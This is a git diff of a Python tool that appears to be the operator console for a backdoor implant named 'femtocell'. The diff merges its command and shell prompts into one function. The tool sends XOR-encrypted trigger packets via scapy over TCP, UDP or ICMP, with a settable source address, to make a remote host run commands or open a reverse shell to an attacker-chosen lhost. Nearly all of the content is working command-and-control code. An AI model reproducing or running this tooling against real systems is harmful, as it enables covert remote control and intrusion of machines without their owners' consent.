@@ -1,3 +1,4 @@
+import cmd
 from email.mime import base
 from re import A
 from turtle import goto
@@ -32,8 +33,9 @@ baseparams = {
 cmdparams = {
     "rhost": "",
     "rport": 445,
-    "command": "whoami",
+    "lhost": "",
     "sport": 6006,
+    "command": "whoami",
     "transport": "tcp"
 }
 
@@ -120,9 +122,9 @@ def main():
                 print_options(baseparams)
             elif user_cmd == "interact":
                 if baseparams["mode"] == "shell":
-                    shellPrompt()
+                    interact(shellparams)
                 elif baseparams["mode"] == "cmd":
-                    cmdPrompt()
+                    interact(cmdparams)
                 else:
                     print("you must set mode")
                     print_options(baseparams)
@@ -132,10 +134,10 @@ def main():
             print_help()
 
 
-def cmdPrompt():
+def interact(params):
     while True:
         user_in = prompt(f'femtocell ({baseparams["mode"]}) ~ ',
-                        history=FileHistory('history/cmd.history'),
+                        history=FileHistory('history/interact.history'),
                         auto_suggest=AutoSuggestFromHistory(),
                         # completer=SQLCompleter,
                         ).split()
@@ -146,12 +148,17 @@ def cmdPrompt():
             if user_cmd == "back" or user_cmd == "exit":
                 return
             elif user_cmd == "options":
-                print_options(cmdparams)
+                print_options(params)
             
             elif user_cmd == "send":
-                if verify():
-                    plaintext = "FC-SH-{}\00".format(cmdparams["command"]) 
-                    send(plaintext)
+                if baseparams["mode"] == "cmd" and verify():
+                    plaintext = "FC-CM-{}\00".format(params["command"])
+                    send(plaintext, cmdparams)
+                elif baseparams["mode"] == "shell" and verify():
+                    plaintext = "FC-SH-{}\00".format(params["lhost"]) 
+                    send(plaintext, shellparams)
+                else:
+                    continue
             else:			
                 continue
         elif len(user_in) == 3:
@@ -160,56 +167,15 @@ def cmdPrompt():
             op_2 = user_in[2]
 
             if user_cmd == "set":
-                if op_1 in cmdparams.keys():
-                    cmdparams[op_1] = op_2
-                    print_options(cmdparams)
+                if op_1 in params.keys():
+                    params[op_1] = op_2
+                    print_options(params)
                 else:
                     print("cmd help")
             else:
                 print("cmd help")
         else:
             print("cmd help")
-
-
-def shellPrompt():
-    while True:
-        user_in = prompt(f'femtocell ({baseparams["mode"]}) ~ ',
-                        history=FileHistory('history/shell.history'),
-                        auto_suggest=AutoSuggestFromHistory(),
-                        # completer=SQLCompleter,
-                        ).split()
-
-        if len(user_in) == 1:
-            user_cmd = user_in[0]
-
-            if user_cmd == "back" or user_cmd == "exit":
-                return
-            elif user_cmd == "options":
-                print_options(shellparams)
-                continue
-            elif user_cmd == "send":
-                if verify():
-                    # TODO listen here for callback
-
-                    plaintext = "FC-SH-{}\00".format(shellparams["lhost"])
-                    send(plaintext) 
-            else:			
-                continue
-        elif len(user_in) == 3:
-            user_cmd = user_in[0]
-            op_1 = user_in[1]
-            op_2 = user_in[2]
-
-            if user_cmd == "set":
-                if op_1 in shellparams.keys():
-                    shellparams[op_1] = op_2
-                    print_options(shellparams)
-                else:
-                    print("shell help")
-            else:
-                print("shell help")
-        else:
-            print("shell help")
 
 
 def verify():
@@ -224,7 +190,11 @@ def verify():
         
         if cmdparams["rhost"] == "": # blank or is invalid ip
             print("rhost incorrect")
-            return False
+            passing = False
+
+        if cmdparams["lhost"] == "": # blank or is invalid ip
+            print('lhost incorrect')
+            passing = False
 
 
     elif baseparams["mode"] == "shell":
@@ -236,32 +206,34 @@ def verify():
         
         if shellparams["rhost"] == "": # blank or is invalid ip
             print('rhost incorrect')
-            return False
+            passing = False
         
         if shellparams["lhost"] == "": # blank or is invalid ip
             print('lhost incorrect')
-            return False
+            passing = False
 
 
     return passing
 
 
-def send(plaintext):
+def send(plaintext, params):
     encrypted = xor_encrypt(plaintext.encode(), 0x10)
 
-    if(shellparams["transport"] == "udp"):
-        scapy.send(scapy.IP(dst=shellparams["rhost"].encode(), src=shellparams["lhost"].encode())/
-        scapy.UDP(sport=shellparams["lport"], dport=shellparams["rport"])/
-        encrypted)
-    elif(shellparams["transport"] == "tcp"):
-        scapy.send(scapy.IP(dst=shellparams["rhost"].encode(), src=shellparams["lhost"].encode())/
-        scapy.TCP(sport=shellparams["lport"], dport=shellparams["rport"], flags="AP")/
-        encrypted)
-    elif(shellparams["transport"] == "icmp"):
-        scapy.send(scapy.IP(dst=shellparams["rhost"].encode(), src=shellparams["lhost"].encode())/
+    if(params["transport"] == "udp"):
+        scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
+        scapy.UDP(sport=params["sport"], dport=params["rport"])/
+        encrypted, verbose=False)
+    elif(params["transport"] == "tcp"):
+        scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
+        scapy.TCP(sport=params["sport"], dport=params["rport"], flags="AP")/
+        encrypted, verbose=False)
+    elif(params["transport"] == "icmp"):
+        scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
         scapy.ICMP(code=1, type=8)/
-        encrypted)
+        encrypted, verbose=False)
 
+    rhost = params["rhost"]
+    print(f"Sending {plaintext} to {rhost}\n")
 
 if(__name__ == "__main__"):
     main()
